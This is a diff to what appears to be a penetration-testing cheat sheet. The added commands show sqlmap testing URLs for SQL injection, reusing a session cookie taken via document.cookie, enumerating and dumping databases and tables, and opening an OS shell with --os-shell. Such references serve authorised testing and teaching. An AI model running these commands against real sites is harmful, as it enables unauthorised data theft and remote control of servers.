@@ -168,19 +168,49 @@ nikto -host $URL
 # sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws.
 
 #To get a list of basic options and switches use:
-python3 sqlmap.py -h
+sqlmap -h (-hh for all options/extended)
 
-#To get a list of all options and switches use:
-python sqlmap.py -hh
+#Simple HTTP GET Based Test
+sqlmap -u https://testsite.com/page.php?id=1 --dbs
 
-Examples:
+# -u state the vulnerable URL
+# --dbs to enumerate the database.
 
-#Burpsuite generated file - In burpsuite intercept tab, you can right click on the request and select "Copy to file" and save the request to a local file. Next you can point SQLMap to that file using the -r parameter:
 
-sqlmap -r request.req --dump --batch
+#Simple HTTP POST Based Test - In burpsuite identify the vulnerable POST request and save it. You can right click on the request and select "Copy to file" and save the request to a local file. Next you can point SQLMap to that file using the -r parameter:
+
+1. sqlmap -r <request_file> -p <vulnerable_parameter> --dbs
+or
+2. sqlmap -r <request_file> --dump --batch
 
 #Syntax for connecting to MySQL
 mysql -h [IP] -u [username] -p
+
+
+###AUTHENTICATED
+
+sqlmap -u "http://www.website.com/viewprofile.aspx?id=1" --cookie="cookie value obtained via document.cookie" --dbs
+
+The above query causes sqlmap to apply various injection techniques on the name parameter of the URL in an attempt to extract the database information of the website.
+
+# -u specifies the target URL
+# --cookie specifies the HTTP cookie header value
+# --dbs enumerates DBMS databases.
+
+Assuming the previous comand retrieved multiple DBs and we want to use sqlmap to retrieve the tables in one database, we can use the below command:
+
+sqlmap -u "http://www.website.com/viewprofile.aspx?id=1" --cookie="cookie value obtained via document.cookie" -D databse_name --tables
+
+# -D specifies the DBMS database to enumerate 
+# --tables enumerates DBMS database tables.
+
+Once the tables found and we want to retrieve/dump the content of a specific table, use command:
+
+sqlmap -u "http://www.website.com/viewprofile.aspx?id=1" --cookie="cookie value obtained via document.cookie" -D databse_name -T table_name --dump
+
+
+#To spawn an interractive shell:
+sqlmap -u "http://www.website.com/viewprofile.aspx?id=1" --cookie="cookie value obtained via document.cookie" --os-shell
 ```
 
 
